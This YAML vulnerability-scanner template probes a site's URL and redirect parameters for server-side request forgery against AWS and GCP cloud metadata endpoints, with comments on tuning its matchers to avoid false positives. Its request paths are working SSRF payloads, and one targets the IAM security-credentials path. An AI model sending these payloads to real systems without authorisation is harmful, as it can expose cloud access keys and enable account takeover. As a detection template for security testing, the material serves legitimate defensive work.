id: ssrf-metadata-url-param-custom
info:
  name: SSRF to Cloud Metadata via URL/Redirect Param (Custom)
  author: watch-recon
  severity: high
  description: >
    Full-response SSRF: a url/redirect/next-style param that fetches an
    attacker-supplied URL and returns the body. Points the param at the cloud
    metadata endpoints and matches on metadata-only tokens in the response.
    Blind SSRF (no body reflected) is NOT covered here -- that needs interactsh,
    which the pipeline currently disables with -ni.
  reference:
    - https://cloud.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf
  tags: ssrf,metadata,generic

http:
  - method: GET
    path:
      # AWS IMDS
      - "{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/"
      - "{{BaseURL}}/?redirect=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
      - "{{BaseURL}}/?next=http://169.254.169.254/latest/meta-data/"
      - "{{BaseURL}}/?dest=http://169.254.169.254/latest/meta-data/"
      - "{{BaseURL}}/?target=http://169.254.169.254/latest/meta-data/"
      # GCP metadata
      - "{{BaseURL}}/?url=http://metadata.google.internal/computeMetadata/v1/"
    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      # Metadata-RESPONSE-only tokens. Deliberately excludes "computeMetadata"
      # and "iam/security-credentials": those strings are part of the injected
      # payload path, so any app that reflects the query string back in its body
      # would match them -- the source of every false positive this template
      # produced. The tokens below only appear in an actual IMDS/metadata
      # *response*, never in the request, so reflection cannot trigger them.
      # GCP is detected via its response header (Metadata-Flavor: Google).
      - type: dsl
        dsl:
          - >-
            contains(body, 'ami-id') ||
            contains(body, 'instance-id') ||
            contains(body, 'AccessKeyId') ||
            contains(body, 'SecretAccessKey') ||
            contains(tolower(header), 'metadata-flavor')
